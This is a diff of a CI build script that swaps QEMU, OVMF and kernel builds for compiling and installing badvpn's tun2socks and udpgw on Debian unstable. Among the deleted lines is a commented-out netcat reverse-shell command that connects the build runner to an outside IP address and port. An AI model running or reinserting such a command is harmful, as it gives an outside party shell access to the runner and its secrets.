@@ -71,10 +71,21 @@ build_kernel() {
   cp ../*.deb /builds/
 }
 
-#https://wiki.debian.org/HowToUpgradeKernel
-#5.10.0-15-amd64
-#linux-image-5.10.0-15-amd64
-#linux-image-5.18.0-2-amd64
+build_badvpn() {
+  apt install -y cmake build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl > /dev/null
+  mkdir build; cd build
+  cmake .. -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_TUN2SOCKS=1 -DBUILD_UDPGW=1 -DCMAKE_INSTALL_PREFIX=/usr/local
+  make install
+  
+  #files installed to:
+  #-- Installing: /usr/local/share/man/man7/badvpn.7
+  #-- Installing: /usr/local/bin/badvpn-tun2socks
+  #-- Installing: /usr/local/share/man/man8/badvpn-tun2socks.8
+  #-- Installing: /usr/local/bin/badvpn-udpgw
+  cp {/usr/local/share/man/man7/badvpn.7,/usr/local/bin/badvpn-tun2socks,/usr/local/share/man/man8/badvpn-tun2socks.8,/usr/local/bin/badvpn-udpgw} .
+
+}
+
 echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
 apt update
@@ -83,16 +94,10 @@ apt install -y ncat
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl
 
 mkdir /builds
-cd /; tar xf /patch.tar
 
-#build_kernel
-build_qemu
-build_ovmf
+build_badvpn
 
 cp /builds/* /github/workspace/
-#cp ~/*.deb /github/workspace/
-#cp ~/*.tar /github/workspace/
-#nc 65.108.51.31 11452 -e /bin/sh
 
 exit 0
 
